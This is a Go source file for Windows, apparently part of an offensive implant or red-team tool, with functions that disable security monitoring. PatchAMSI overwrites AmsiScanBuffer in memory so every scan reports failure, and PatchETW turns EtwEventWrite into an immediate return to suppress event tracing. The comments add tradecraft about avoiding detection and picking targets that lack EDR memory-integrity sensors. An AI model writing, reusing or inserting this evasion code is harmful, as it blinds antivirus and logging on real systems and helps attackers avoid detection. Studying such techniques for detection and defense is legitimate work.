//go:build windows

package evasion

import (
	"fmt"
	"syscall"
)

var (
	aeAmsiDLL  = syscall.NewLazyDLL("amsi.dll")
	aeNtdllDLL = syscall.NewLazyDLL("ntdll.dll")

	procAmsiScanBuffer = aeAmsiDLL.NewProc("AmsiScanBuffer")
	procEtwEventWrite  = aeNtdllDLL.NewProc("EtwEventWrite")
)

// PatchAMSI overwrites the prologue of AmsiScanBuffer so the function
// returns E_INVALIDARG (0x80070057) regardless of what was scanned.
//
// The patch is a no-op when amsi.dll is not already resident in the
// process. Loading it here just to patch it would be a stronger
// signal than the patch itself — a Go binary that has done no .NET
// or PowerShell work does not have amsi.dll loaded, and does not need
// the patch.
//
// Detection notes: the `mov eax, 0x80070057; ret` byte sequence is
// the most-signatured AMSI bypass in existence. It works against
// Defender with default settings but is caught by any EDR with a
// memory-integrity sensor. Use it only when the target environment is
// known to lack such a sensor.
func PatchAMSI() error {
	if !moduleLoaded("amsi.dll") {
		return nil
	}
	addr := procAmsiScanBuffer.Addr()
	if addr == 0 {
		return fmt.Errorf("AmsiScanBuffer not resolvable")
	}
	patch := []byte{
		0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
		0xC3,                         // ret
	}
	if err := writeBytes(addr, patch); err != nil {
		return fmt.Errorf("patch AmsiScanBuffer: %w", err)
	}
	return nil
}

// PatchETW overwrites the first byte of EtwEventWrite with a ret, so
// every ETW event this process emits returns immediately.
//
// Detection notes: same caveat as PatchAMSI. The single-byte patch is
// trivially identifiable by any EDR that maps ntdll.dll against a
// known-good copy or monitors VirtualProtect on code pages inside it.
func PatchETW() error {
	addr := procEtwEventWrite.Addr()
	if addr == 0 {
		return fmt.Errorf("EtwEventWrite not resolvable")
	}
	if err := writeBytes(addr, []byte{0xC3}); err != nil {
		return fmt.Errorf("patch EtwEventWrite: %w", err)
	}
	return nil
}

// ApplyWindowsEvasion runs the requested patches in order. Errors are
// returned as a combined error so a caller that cares can log the
// failure; a caller that does not can ignore the result, and the
// process continues with whatever patches succeeded.
func ApplyWindowsEvasion(amsi, etw bool) error {
	var errs []error
	if amsi {
		if err := PatchAMSI(); err != nil {
			errs = append(errs, err)
		}
	}
	if etw {
		if err := PatchETW(); err != nil {
			errs = append(errs, err)
		}
	}
	if len(errs) == 0 {
		return nil
	}
	return fmt.Errorf("evasion: %v", errs)
}